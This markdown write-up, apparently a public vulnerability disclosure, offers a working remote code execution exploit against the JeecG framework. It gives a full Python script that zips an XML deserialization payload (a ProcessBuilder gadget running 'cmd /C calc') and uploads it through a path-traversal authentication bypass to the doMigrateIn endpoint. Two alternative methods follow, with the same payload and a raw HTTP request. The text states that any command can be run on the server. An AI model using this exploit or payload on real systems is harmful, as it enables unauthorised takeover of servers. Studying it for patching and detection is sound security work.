# JeeCG client-side remote code execution
* You can download the source code from https://github.com/jeecgboot/jeecg

---------------------------------------------------------------------------------------------------
# EXP
```
import zipfile
import xml.etree.ElementTree as ET
from xml.dom import minidom
import http.client
import mimetypes
from urllib.parse import urlparse

# XML content
data = """
<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>cmd</string>
                    <string>/C</string>
                    <string>calc</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
"""

# Formatting XML string using minidom
pretty_xml_as_string = minidom.parseString(ET.tostring(ET.fromstring(data))).toprettyxml()

# Create a ZIP file in write mode
with zipfile.ZipFile('1.sql.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
    # Adding XML data as a file into the ZIP file
    zipf.writestr('1.sql', pretty_xml_as_string)

def encode_multipart_formdata(fields, files):
    """
    'fields' is a sequence where each element is a tuple containing (name, value) representing a form field.
    'files' is a sequence where each element is a tuple containing (name, filename, value) representing a file to be uploaded.
    Returns the encoded multipart/form-data encoded data and content type.
    """
    boundary = '----------ThIs_Is_tHe_bouNdaRY_$'
    CRLF = b'\r\n'
    L = []
    for (key, value) in fields:
        L.append(b'--' + boundary.encode('utf-8'))
        L.append(b'Content-Disposition: form-data; name="' + key.encode('utf-8') + b'"')
        L.append(b'')
        L.append(value.encode('utf-8') if isinstance(value, str) else value)
    for (key, filename, value) in files:
        L.append(b'--' + boundary.encode('utf-8'))
        L.append(b'Content-Disposition: form-data; name="' + key.encode('utf-8') + b'"; filename="' + filename.encode('utf-8') + b'"')
        L.append(b'Content-Type: ' + (mimetypes.guess_type(filename)[0] or "application/octet-stream").encode('utf-8'))
        L.append(b'')
        L.append(value)
    L.append(b'--' + boundary.encode('utf-8') + b'--')
    L.append(b'')
    body = CRLF.join(L)
    content_type = 'multipart/form-data; boundary={}'.format(boundary)
    return content_type, body

# Read file content
with open('1.sql.zip', 'rb') as f:
    file_content = f.read()

# File information to upload
files = [('file', '1.sql.zip', file_content)]
# Other form data
fields = [('name', '1.sql.zip')]

# Constructing the request body
content_type, body = encode_multipart_formdata(fields, files)

# Target URL
url_str = 'http://xxxx:9000/jeecg/loginControllerrest/v2/api-docs/../../../cgformSqlController.do?doMigrateIn'
url = urlparse(url_str)

# Create connection
conn = http.client.HTTPConnection(url.hostname, url.port)

# Prepare headers
headers = {
    'Content-Type': content_type,
    'Content-Length': str(len(body)),
    # Additional headers might be needed, add them according to the actual situation
}

# Send POST request
conn.request("POST", url.path + '?' + url.query, body, headers)

# Get response
response = conn.getresponse()
print('Status:', response.status, response.reason)

# Read response content
data = response.read()

# Print response content
print(data.decode('utf-8'))

# Close connection
conn.close()
```



---------------------------------------------------------------------------------------------------
## The second approach
Save the following content as 1.xml
```
<sorted-set>
        <string>foo</string>
        <dynamic-proxy>
                <interface>java.lang.Comparable</interface>
                <handler class="java.beans.EventHandler">
                    <target class="java.lang.ProcessBuilder">
                        <command>
                                <string>cmd</string>
                                <string>/C</string>
                                <string>calc</string>
                            </command>
                    </target>
                <action>start</action>
            </handler>
            </dynamic-proxy>
        </sorted-set>
```

Compress 1.xml into 1.zip and then rename it to 1.sql.zip.
![image](https://github.com/rbndd/tmp/assets/72015616/f84468a7-6139-4216-b226-13250260c285)

You can login and upload the file，the you can run any command on server by editing，compressing and uploading the xml

![image](https://github.com/rbndd/tmp/assets/72015616/708e7146-87d3-461a-a45b-1111a6dfee27)


![image](https://github.com/rbndd/tmp/assets/72015616/d345286b-b089-45f6-9658-96af0bdfc440)


![image](https://github.com/rbndd/tmp/assets/72015616/4305a262-3a47-4b14-bfc6-6fd3bf0aae8f)


![image](https://github.com/rbndd/tmp/assets/72015616/64ec05a6-4d9f-4bf3-b7bb-7dcd27f3f795)



## the third approach

Bypass authentication and upload a file through the frontend calling upload interface.
```
POST /jeecg/loginControllerrest/v2/api-docs/../../../cgformSqlController.do?doMigrateIn HTTP/1.1
Host: 10.85.212.54:9000
Content-Length: 649
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIEcBbhinrYepv5J5
Accept: */*
Origin: http://10.85.212.54:9000
Referer: http://10.85.212.54:9000/jeecg/cgformSqlController.do?toCgformMigrate&_=1711013666543
Accept-Language: zh-CN,zh;q=0.9
Cookie: i18n_browser_Lang=zh-cn; JEECGINDEXSTYLE=fineui; JSESSIONID=BCDF7360D9538629391AAE7AC5FCD0F9; ZINDEXNUMBER=2070
Connection: close

------WebKitFormBoundaryIEcBbhinrYepv5J5
Content-Disposition: form-data; name="name"

1.sql.zip
------WebKitFormBoundaryIEcBbhinrYepv5J5
Content-Disposition: form-data; name="file"; filename="1.sql.zip"
Content-Type: application/x-zip-compressed

{{your file content（1.sql.zip）}}

------WebKitFormBoundaryIEcBbhinrYepv5J5--
```

![image](https://github.com/rbndd/tmp/assets/72015616/b4340211-034b-4bc6-996b-81bdb0c44ef4)
![image](https://github.com/rbndd/tmp/assets/72015616/6e12329d-eb1c-46f3-b891-d2315aba6b34)


